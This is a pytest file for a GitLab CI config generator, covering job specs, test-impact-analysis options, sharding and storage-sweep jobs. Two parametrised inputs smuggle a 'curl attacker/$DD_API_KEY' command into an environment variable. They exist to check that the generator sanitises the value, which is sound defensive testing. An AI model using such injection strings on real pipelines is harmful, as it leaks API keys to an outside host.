"""Tests for scripts/gen_gitlab_config.py."""

import importlib.util
import io
import pathlib
import subprocess
import sys
import types
from unittest import mock

import pytest


_SCRIPT_PATH = pathlib.Path(__file__).resolve().parents[2] / "scripts" / "gen_gitlab_config.py"


@pytest.fixture(scope="module")
def gen_gitlab_config_mod():
    # The script parses argv and imports the generator-only ruamel dependency at import time.
    ruamel = types.ModuleType("ruamel")
    yaml = types.ModuleType("ruamel.yaml")
    yaml.YAML = object
    ruamel.yaml = yaml

    spec = importlib.util.spec_from_file_location("gen_gitlab_config", _SCRIPT_PATH)
    assert spec is not None and spec.loader is not None
    module = importlib.util.module_from_spec(spec)
    original_path = list(sys.path)
    with mock.patch.dict(sys.modules, {"ruamel": ruamel, "ruamel.yaml": yaml, spec.name: module}):
        with mock.patch.object(sys, "argv", [str(_SCRIPT_PATH)]):
            spec.loader.exec_module(module)
        try:
            yield module
        finally:
            sys.path[:] = original_path


@pytest.mark.parametrize(
    "value, expected",
    [
        (None, "false"),
        ("", "false"),
        ("false", "false"),
        ("true", "true"),
        ("TRUE", "true"),
        (" true", "false"),
        ("$(curl attacker/$DD_API_KEY)", "false"),
        ('true" && curl attacker/$DD_API_KEY #', "false"),
    ],
)
def test_get_bool_env_only_allows_literal_true(gen_gitlab_config_mod, monkeypatch, value, expected):
    monkeypatch.delenv("NIGHTLY_BUILD", raising=False)
    if value is not None:
        monkeypatch.setenv("NIGHTLY_BUILD", value)

    assert gen_gitlab_config_mod._get_bool_env("NIGHTLY_BUILD") == expected


def test_jobspec_sanitizes_nightly_build_before_script(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")

    config = str(gen_gitlab_config_mod.JobSpec(name="suite", stage="core"))

    assert '    - export NIGHTLY_BUILD="false"' in config
    assert "$(curl" not in config
    assert "$DD_API_KEY" not in config


def test_testmon_is_enabled_for_llmobs(gen_gitlab_config_mod):
    config = str(gen_gitlab_config_mod.JobSpec(name="llmobs", stage="llmobs", suite="llmobs::llmobs"))
    assert "extends: [.test_base, .llmobs_tia]" in config
    other = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer"))
    assert ".llmobs_tia" not in other


def test_testmon_preserves_snapshot_base(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value=".riot/requirements/wait.txt"):
        config = str(
            gen_gitlab_config_mod.JobSpec(name="llmobs", stage="llmobs", suite="llmobs::llmobs", snapshot=True)
        )
    assert "extends: [.test_base_snapshot, .llmobs_tia]" in config


@pytest.mark.parametrize("diagnostics", ["off", "selection", "full"])
def test_testmon_diagnostics_reach_child_jobs(gen_gitlab_config_mod, monkeypatch, diagnostics):
    monkeypatch.setenv("DD_LLMOBS_TIA_DIAGNOSTICS", diagnostics)
    config = str(gen_gitlab_config_mod.JobSpec(name="llmobs", stage="llmobs", suite="llmobs::llmobs"))
    assert f'DD_LLMOBS_TIA_DIAGNOSTICS: "{diagnostics}"' in config


def test_testmon_diagnostics_reject_invalid_values(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("DD_LLMOBS_TIA_DIAGNOSTICS", "unknown")
    with pytest.raises(ValueError, match="DD_LLMOBS_TIA_DIAGNOSTICS"):
        str(gen_gitlab_config_mod.JobSpec(name="llmobs", stage="llmobs", suite="llmobs::llmobs"))


@pytest.mark.parametrize(
    "config, message",
    [
        ({"parallelism": 2}, "must use venvs_per_job"),
        ({"ddtest": True, "venvs_per_job": 2}, "shard with ddtest_nodes"),
    ],
)
def test_gen_tests_rejects_unsupported_sharding_controls(gen_gitlab_config_mod, config, message):
    with pytest.raises(ValueError, match=message):
        gen_gitlab_config_mod._gen_tests({"suite": {"type": "test", **config}}, ["suite"])


def test_llmobs_cold_start_pair_is_opt_in_and_matches_fifth_shard(gen_gitlab_config_mod, monkeypatch, tmp_path):
    module = gen_gitlab_config_mod
    monkeypatch.setattr(module, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(module, "_wait_lockfile", lambda: ".riot/requirements/wait.txt")
    hashes = tuple(f"hash{i}" for i in range(10))
    monkeypatch.setattr(
        module,
        "collect_all_suite_venv_info",
        lambda configs: {
            "llmobs::llmobs": module.SuiteVenvInfo(
                hashes, tuple((hash_, "3.13" if i in (4, 9) else "3.12") for i, hash_ in enumerate(hashes)), {}
            )
        },
    )
    config = {"llmobs::llmobs": {"snapshot": True, "no_proxy": True, "venvs_per_job": 2}}
    module._gen_tests(config, ["llmobs::llmobs"])
    default = module.TESTS_GEN.read_text()
    assert "llmobs/file-itr-cold-start:" not in default
    monkeypatch.setenv("DD_LLMOBS_TIA_COLD_START_PAIR", "true")
    module._gen_tests(config, ["llmobs::llmobs"])
    generated = module.TESTS_GEN.read_text()
    assert generated.startswith(default)
    for name, mode in (("file-itr-cold-start", "file"), ("testmon-cold-start", "testmon_cold")):
        job = generated.split(f"llmobs/{name}:\n", 1)[1].split("\nllmobs/", 1)[0]
        assert "extends: [.test_base_snapshot, .llmobs_tia]" in job
        assert f"DD_LLMOBS_TIA_CI_MODE: {mode}" in job
        assert 'DD_LLMOBS_TIA_DIAGNOSTICS: "off"' in job
        assert 'TEST_ENVIRONMENTS_1: "hash4 hash9"' in job
        assert "  cache: []" in job
        assert "pytest" not in job  # Both use the same suitespec commands via .test_base.

    with monkeypatch.context() as patch:
        patch.setattr(module, "MAX_TOTAL_TEST_JOBS", 7)
        with pytest.raises(ValueError, match="would produce 7 test job instances"):
            module._gen_tests(config, ["llmobs::llmobs"])

    config["llmobs::llmobs"]["skip"] = True
    with pytest.raises(ValueError, match="requires the llmobs suite to be enabled"):
        module._gen_tests(config, ["llmobs::llmobs"])


def test_storage_sweep_only_emits_python313_pytest_jobs_without_database_artifacts(
    gen_gitlab_config_mod, monkeypatch, tmp_path
):
    module = gen_gitlab_config_mod
    monkeypatch.setattr(module, "TESTS_GEN", tmp_path / "tests-gen.yml")
    monkeypatch.setattr(module, "_wait_lockfile", lambda: ".riot/requirements/wait.txt")
    monkeypatch.setenv("DD_TIA_STORAGE_SWEEP", "true")
    monkeypatch.delenv("DD_LLMOBS_TIA_COLD_START_PAIR", raising=False)
    test_environments = {
        "llmobs::llmobs": (
            types.SimpleNamespace(hash="old", python="3.12", runs=(types.SimpleNamespace(command="pytest {cmdargs}"),)),
            types.SimpleNamespace(hash="new", python="3.13", runs=(types.SimpleNamespace(command="pytest {cmdargs}"),)),
        ),
        "other": (
            types.SimpleNamespace(
                hash="wrapper", python="3.13", runs=(types.SimpleNamespace(command="python -m pytest {cmdargs}"),)
            ),
        ),
        "native": (
            types.SimpleNamespace(hash="native", python="3.13", runs=(types.SimpleNamespace(command="cmake build"),)),
        ),
    }
    suitespec = types.ModuleType("tests.suitespec")
    suitespec.get_test_environments = lambda nightly=False: test_environments
    monkeypatch.setitem(sys.modules, "tests.suitespec", suitespec)
    suites = {
        "llmobs::llmobs": {"snapshot": True, "venvs_per_job": 2},
        "other": {"venvs_per_job": 1},
        "native": {"venvs_per_job": 1},
    }
    module._gen_tests(suites, list(suites))
    generated = module.TESTS_GEN.read_text()
    assert "core/native:" not in generated
    assert "llmobs/file-itr-cold-start:" not in generated
    assert 'TEST_ENVIRONMENTS_1: "old"' not in generated
    for name, hash_ in (("llmobs/llmobs", "new"), ("core/other", "wrapper")):
        job = generated.split(f"{name}:\n", 1)[1].split("\n\n", 1)[0]
        assert f'TEST_ENVIRONMENTS_1: "{hash_}"' in job
        assert 'DD_TIA_STORAGE_SWEEP: "true"' in job
        assert "  cache: []" in job
        assert "  artifacts:\n    paths:\n      - core.*" in job
        assert "  after_script:\n    - python3 scripts/tia_storage_report.py" in job
        assert "    - !reference [.testrunner, after_script]" in job
    assert generated.count("  cache: []") == 2
    assert generated.count("python3 scripts/tia_storage_report.py") == 2


def test_storage_sweep_selects_all_enabled_test_suites(gen_gitlab_config_mod, monkeypatch):
    import tests

    module = gen_gitlab_config_mod
    suitespec = types.ModuleType("tests.suitespec")
    suitespec.get_suites = lambda: {
        "one": {"type": "test"},
        "two": {"type": "test"},
        "disabled": {"type": "test", "skip": True},
        "benchmark": {"type": "benchmark"},
    }
    monkeypatch.setitem(sys.modules, "tests.suitespec", suitespec)
    monkeypatch.setattr(tests, "suitespec", suitespec, raising=False)
    monkeypatch.setattr(module.args, "suites", ["one"])
    monkeypatch.setenv("DD_TIA_STORAGE_SWEEP", "true")
    selected = []
    monkeypatch.setattr(module, "_gen_tests", lambda suites, required: selected.extend(required))
    monkeypatch.setattr(module, "_gen_benchmarks", lambda suites, required: None)

    module.gen_required_suites()

    assert selected == ["one", "two"]


def test_parallelism_defaults_to_one_job(gen_gitlab_config_mod):
    assert gen_gitlab_config_mod.calculate_parallelism_from_venvs(12) == 1


def test_ddtest_requires_a_test_path_for_every_venv(gen_gitlab_config_mod):
    info = gen_gitlab_config_mod.SuiteVenvInfo(
        environment_hashes=("hash-with-path", "hash-without-path"),
        environments=(("hash-with-path", "3.12"), ("hash-without-path", "3.12")),
        ddtest_metadata={
            "hash-with-path": ("first.txt", "tests/internal", "pytest tests/internal", ""),
            "hash-without-path": ("second.txt", "", "pytest tests/internal", ""),
        },
    )

    with pytest.raises(ValueError, match="hash-without-path"):
        gen_gitlab_config_mod._ddtest_module().validate_ddtest_venv_test_locations(
            "internal",
            info.environments,
            {environment_hash: metadata[1] for environment_hash, metadata in info.ddtest_metadata.items()},
        )


def test_ddtest_jobs_preserve_the_suite_command(gen_gitlab_config_mod):
    output = io.StringIO()
    ddtest_jobs = gen_gitlab_config_mod._ddtest_module()
    metadata = {
        "env123": (
            ".riot/requirements/env123.txt",
            "tests/tracer/**/test*.py",
            "pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/",
            "PYTHONOPTIMIZE=1",
        )
    }

    ddtest_jobs.emit_ddtest_jobs(
        output,
        suite="tracer",
        stage="core",
        clean_name="tracer",
        config={"env": {}},
        environments=[("env123", "3.12")],
        k=1,
        metadata=metadata,
        wait_lockfile=".riot/requirements/wait.txt",
    )

    content = output.getvalue()
    assert "extends: .ddtest_plan" in content
    assert "extends: .ddtest_run" in content
    assert "DDTEST_COMMAND_env123: pytest -v --ignore=tests/tracer/test_uwsgi_shutdown.py tests/tracer/" in content
    assert "DDTEST_ENV_env123: PYTHONOPTIMIZE=1" in content


def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_mod):
    payload = gen_gitlab_config_mod._shell_environment(
        {
            "DDTEST_PYTEST_ADDOPTS": "-vv --ignore-glob='*civisibility*'",
            "DDTEST_SUITE_PATH": "tests/integration",
        }
    )
    result = subprocess.run(
        [
            "bash",
            "-c",
            'env_var=DDTEST_ENV; eval "export ${!env_var}"; printf "%s" "$DDTEST_PYTEST_ADDOPTS"',
        ],
        check=True,
        capture_output=True,
        env={"DDTEST_ENV": payload},
        text=True,
    )

    assert result.stdout == "-vv --ignore-glob='*civisibility*'"
    assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2


def test_jobs_use_declared_environments(gen_gitlab_config_mod):
    environment_hashes = ("first", "second", "third")
    config = str(
        gen_gitlab_config_mod.JobSpec(
            name="tracer",
            stage="core",
            suite="tracer",
            parallelism=2,
            environment_hashes=environment_hashes,
        )
    )

    assert "  extends: .test_base" in config
    assert "    - job: extract_test_artifacts" in config
    assert "    TEST_SUITE: tracer" in config
    configured_hashes = {
        environment_hash
        for line in config.splitlines()
        if line.strip().startswith("TEST_ENVIRONMENTS_")
        for environment_hash in line.rsplit('"', 2)[1].split()
    }
    assert configured_hashes == set(environment_hashes)


def test_unpinned_jobs_allow_prerelease_dependencies(gen_gitlab_config_mod, monkeypatch):
    monkeypatch.setenv("UNPIN_DEPENDENCIES", "true")

    config = str(gen_gitlab_config_mod.JobSpec(name="tracer", stage="core", suite="tracer"))

    assert "    UV_PRERELEASE: allow" in config


def test_snapshot_job_uses_defined_base(gen_gitlab_config_mod):
    with mock.patch.object(gen_gitlab_config_mod, "_wait_lockfile", return_value=".riot/requirements/wait.txt"):
        config = str(
            gen_gitlab_config_mod.JobSpec(name="requests", stage="contrib", suite="contrib::requests", snapshot=True)
        )
    extends = next(line.removeprefix("  extends: ") for line in config.splitlines() if line.startswith("  extends: "))
    test_templates = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()

    assert extends == ".test_base_snapshot"
    assert f"{extends}:" in test_templates
